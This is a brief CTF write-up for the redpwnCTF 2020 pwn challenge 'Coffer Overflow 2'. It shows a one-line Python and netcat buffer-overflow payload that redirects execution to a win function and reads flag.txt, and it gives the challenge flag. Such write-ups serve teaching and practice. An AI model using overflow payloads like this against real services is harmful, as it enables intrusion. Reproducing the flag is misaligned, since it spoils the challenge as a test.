# Coffer Overflow 2
Points: 304
## Category
Pwn
## Problem Statement
You'll have to jump to a function now!?\
nc 2020.redpwnc.tf 31908\
Attachment : "coffer-overflow-2" and "coffer-overflow-2.c"
## Solution
* Again we followed [CTF101 buffer overflow](https://ctf101.org/binary-exploitation/buffer-overflow/).
* It asked us to call one specific function.
* `python -c 'print("\x00"*24+"\xea\x06\x40"+"\x00"*5);print("cat flag.txt")' | nc 2020.redpwnc.tf 31908`
## Flag
```
flag{ret_to_b1n_m0re_l1k3_r3t_t0_w1n}
```